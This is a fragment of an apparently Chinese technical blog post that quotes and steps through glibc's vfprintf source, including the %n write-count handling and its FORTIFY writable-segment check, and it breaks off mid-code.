class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">LABEL (form_number):      \</span><br><span class="line">      <span class="keyword">if</span> ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>)      \</span><br><span class="line">&#123;      \</span><br><span class="line">  <span class="keyword">if</span> (! readonly_format)      \</span><br><span class="line">    &#123;      \</span><br><span class="line">      <span class="keyword">extern</span> <span class="type">int</span> __readonly_area (<span class="type">const</span> <span class="type">void</span> *, <span class="type">size_t</span>)      \</span><br><span class="line">attribute_hidden;      \</span><br><span class="line">      readonly_format      \</span><br><span class="line">= __readonly_area (format, ((STR_LEN (format) + <span class="number">1</span>)      \</span><br><span class="line">    * <span class="keyword">sizeof</span> (CHAR_T)));      \</span><br><span class="line">    &#125;      \</span><br><span class="line">  <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)      \</span><br><span class="line">    __libc_fatal (<span class="string">&quot;*** %n in writable segment detected ***\n&quot;</span>);      \</span><br><span class="line">&#125;      \</span><br><span class="line">      <span class="comment">/* Answer the count of characters written.  */</span>      \</span><br><span class="line">      <span class="type">void</span> *ptrptr = process_arg_pointer ();      \</span><br><span class="line">      <span class="keyword">if</span> (is_longlong)      \</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *) ptrptr = done;      \</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_long_num)      \</span><br><span class="line">*(<span class="type">long</span> <span class="type">int</span> *) ptrptr = done;      \</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (is_char)      \</span><br><span class="line">*(<span class="type">char</span> *) ptrptr = done;      \</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!is_short)      \</span><br><span class="line">*(<span class="type">int</span> *) ptrptr = done;      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">*(<span class="type">short</span> <span class="type">int</span> *) ptrptr = done;      \</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4 id="LABEL-unknow"><a href="#LABEL-unknow" class="headerlink" title="LABEL(unknow)"></a>LABEL(unknow)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LABEL (form_unknown):</span><br><span class="line">  <span class="keyword">if</span> (spec == L_(<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The format string ended before the specifier is complete.  */</span></span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we are in the fast loop force entering the complicated</span></span><br><span class="line"><span class="comment">     one.  */</span></span><br><span class="line">  <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以继续分析vfprintf 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The character used as thousands separator.  */</span></span><br><span class="line">  THOUSANDS_SEP_T thousands_sep = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The string describing the size of groups of digits.  */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *grouping;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Place to accumulate the result.  */</span></span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Current character in format string.  */</span></span><br><span class="line">  <span class="type">const</span> UCHAR_T *f;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* End of leading constant string.  */</span></span><br><span class="line">  <span class="type">const</span> UCHAR_T *lead_str_end;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Points to next format specifier.  */</span></span><br><span class="line">  <span class="type">const</span> UCHAR_T *end_of_spec;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Buffer intermediate results.  */</span></span><br><span class="line">  CHAR_T work_buffer[WORK_BUFFER_SIZE];</span><br><span class="line">  CHAR_T *workend;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to save the original argument pointer.  */</span></span><br><span class="line">  va_list ap_save;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Count number of specifiers we already processed.  */</span></span><br><span class="line">  <span class="type">int</span> nspecs_done;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For the %m format we may need the current `errno&#x27; value.  */</span></span><br><span class="line">  <span class="type">int</span> save_errno = errno;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1 if format is in read-only memory, -1 if it is in writable memory,</span></span><br><span class="line"><span class="comment">     0 if unknown.  */</span></span><br><span class="line">  <span class="type">int</span> readonly_format = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Orient the stream.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ORIENT</span></span><br><span class="line">  ORIENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check of arguments.  */</span></span><br><span class="line">  ARGCHECK (s, format);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ORIENT</span></span><br><span class="line">  <span class="comment">/* Check for correct orientation.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (s) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; _IO_fwide (s, <span class="keyword">sizeof</span> (CHAR_T) == <span class="number">1</span> ? <span class="number">-1</span> : <span class="number">1</span>)</span><br><span class="line">      != (<span class="keyword">sizeof</span> (CHAR_T) == <span class="number">1</span> ? <span class="number">-1</span> : <span class="number">1</span>))</span><br><span class="line">    <span class="comment">/* The stream is already oriented otherwise.  */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line">    <span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">       for the stream and then call us again.  */</span></span><br><span class="line">    <span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize local variables.  */</span></span><br><span class="line">  done = <span class="number">0</span>;</span><br><span class="line">  grouping = (<span class="type">const</span> <span class="type">char</span> *) <span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __va_copy</span></span><br><span class="line">  <span class="comment">/* This macro will be available soon in gcc&#x27;s &lt;stdarg.h&gt;.  We need it</span></span><br><span class="line"><span class="comment">     since on some systems `va_list&#x27; is not an integral type.  */</span></span><br><span class="line">  __va_copy (ap_save, ap);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  ap_save = ap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  nspecs_done = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock stream.  */</span></span><br><span class="line">  _IO_cleanup_region_start ((<span class="type">void</span> (*) (<span class="type">void</span> *)) &amp;_IO_funlockfile, s);</span><br><span class="line">  _IO_flockfile (s);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Write the literal text before the first format.  */</span></span><br><span class="line">  outstring ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we only have to print a simple string, return now.  */</span></span><br><span class="line">  <span class="keyword">if</span> (*f == L_(<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    <span class="keyword">goto</span> all_done;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process whole format string.  */</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      STEP0_3_TABLE;</span><br><span class="line">      STEP4_TABLE;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> is_negative;<span class="comment">/* Flag for negative number.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> longlong;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> word;</span><br><span class="line">      &#125; number;</span><br><span class="line">      <span class="type">int</span> base;</span><br><span class="line">      <span class="class"><span class="keyword">union</span> <span class="title">printf_arg</span> <span class="title">the_arg</span>;</span></span><br><span class="line">      CHAR_T *<span class="built_in">string</span>;<span class="comment">/* Pointer to argument string.  */</span></span><br><span class="line">      <span class="type">int</span> alt = <span class="number">0</span>;<span class="comment">/* Alternate format.  */</span></span><br><span class="line">      <span class="type">int</span> space = <span class="number">0</span>;<span class="comment">/* Use space prefix if no sign is needed.  */</span></span><br><span class="line">      <span class="type">int</span> left = <span class="number">0</span>;<span class="comment">/* Left-justify output.  */</span></span><br><span class="line">      <span class="type">int</span> showsign = <span class="number">0</span>;<span class="comment">/* Always begin with plus or minus sign.  */</span></span><br><span class="line">      <span class="type">int</span> group = <span class="number">0</span>;<span class="comment">/* Print numbers according grouping rules.  */</span></span><br><span class="line">      <span class="comment">/* Argument is long double/long long int.  Only used if</span></span><br><span class="line"><span class="comment"> double/long double or long int/long long int are distinct.  */</span></span><br><span class="line">      <span class="type">int</span> is_long_double __attribute__ ((unused)) = <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> is_short = <span class="number">0</span>;<span class="comment">/* Argument is short int.  */</span></span><br><span class="line">      <span class="type">int</span> is_long = <span class="number">0</span>;<span class="comment">/* Argument is long int.  */</span></span><br><span class="line">      <span class="type">int</span> is_char = <span class="number">0</span>;<span class="comment">/* Argument is promoted (unsigned) char.  */</span></span><br><span class="line">      <span class="type">int</span> width = <span class="number">0</span>;<span class="comment">/* Width of output; 0 means none specified.  */</span></span><br><span class="line">      <span class="type">int</span> prec = <span class="number">-1</span>;<span class="comment">/* Precision of output; -1 means none specified.  */</span></span><br><span class="line">      <span class="comment">/* This flag is set by the &#x27;I&#x27; modifier and selects the use of the</span></span><br><span class="line"><span class="comment"> `outdigits&#x27; as determined by the current locale.  */</span></span><br><span class="line">      <span class="type">int</span> use_outdigits = <span class="number">0</span>;</span><br><span class="line">      UCHAR_T pad = L_(<span class="string">&#x27; &#x27;</span>);<span class="comment">/* Padding character.  */</span></span><br><span class="line">      CHAR_T spec;</span><br><span class="line"></span><br><span class="line">      workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27; &#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_space):</span><br><span class="line">      space = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;+&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_plus):</span><br><span class="line">      showsign = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;-&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_minus):</span><br><span class="line">      left = <span class="number">1</span>;</span><br><span class="line">      pad = L_(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;#&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_hash):</span><br><span class="line">      alt = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;0&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_zero):</span><br><span class="line">      <span class="keyword">if</span> (!left)</span><br><span class="line">pad = L_(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The &#x27;\&#x27;&#x27; flag.  */</span></span><br><span class="line">    LABEL (flag_quote):</span><br><span class="line">      group = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (grouping == (<span class="type">const</span> <span class="type">char</span> *) <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class="line">    _NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class="line">  <span class="keyword">if</span> (*grouping == <span class="string">&#x27;\0&#x27;</span> || *grouping == CHAR_MAX</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      || thousands_sep == <span class="string">L&#x27;\0&#x27;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      || *thousands_sep == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      )</span><br><span class="line">    grouping = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (flag_i18n):</span><br><span class="line">      use_outdigits = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Get width from argument.  */</span></span><br><span class="line">    LABEL (width_asterics):</span><br><span class="line">      &#123;</span><br><span class="line"><span class="type">const</span> UCHAR_T *tmp;<span class="comment">/* Temporary value.  */</span></span><br><span class="line"></span><br><span class="line">tmp = ++f;</span><br><span class="line"><span class="keyword">if</span> (ISDIGIT (*tmp))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> pos = read_int (&amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">-1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">__set_errno (EOVERFLOW);</span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos &amp;&amp; *tmp == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line">      <span class="comment">/* The width comes from a positional parameter.  */</span></span><br><span class="line">      <span class="keyword">goto</span> do_positional;</span><br><span class="line">  &#125;</span><br><span class="line">width = va_arg (ap, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Negative width means left justified.  */</span></span><br><span class="line"><span class="keyword">if</span> (width &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    width = -width;</span><br><span class="line">    pad = L_(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    left = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      JUMP (*f, step1_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Given width in format string.  */</span></span><br><span class="line">    LABEL (width):</span><br><span class="line">      width = read_int (&amp;f);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (width == <span class="number">-1</span>))</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EOVERFLOW);</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line">      JUMP (*f, step1_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (precision):</span><br><span class="line">      ++f;</span><br><span class="line">      <span class="keyword">if</span> (*f == L_(<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> UCHAR_T *tmp;<span class="comment">/* Temporary value.  */</span></span><br><span class="line"></span><br><span class="line">  tmp = ++f;</span><br><span class="line">  <span class="keyword">if</span> (ISDIGIT (*tmp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> pos = read_int (&amp;tmp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (pos == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EOVERFLOW);</span><br><span class="line">  done = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (pos &amp;&amp; *tmp == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* The precision comes from a positional parameter.  */</span></span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line">    &#125;</span><br><span class="line">  prec = va_arg (ap, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the precision is negative the precision is omitted.  */</span></span><br><span class="line">  <span class="keyword">if</span> (prec &lt; <span class="number">0</span>)</span><br><span class="line">    prec = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (ISDIGIT (*f))</span><br><span class="line">&#123;</span><br><span class="line">  prec = read_int (&amp;f);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The precision was specified in this case as an extremely</span></span><br><span class="line"><span class="comment">     large positive value.  */</span></span><br><span class="line">  <span class="keyword">if</span> (prec == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EOVERFLOW);</span><br><span 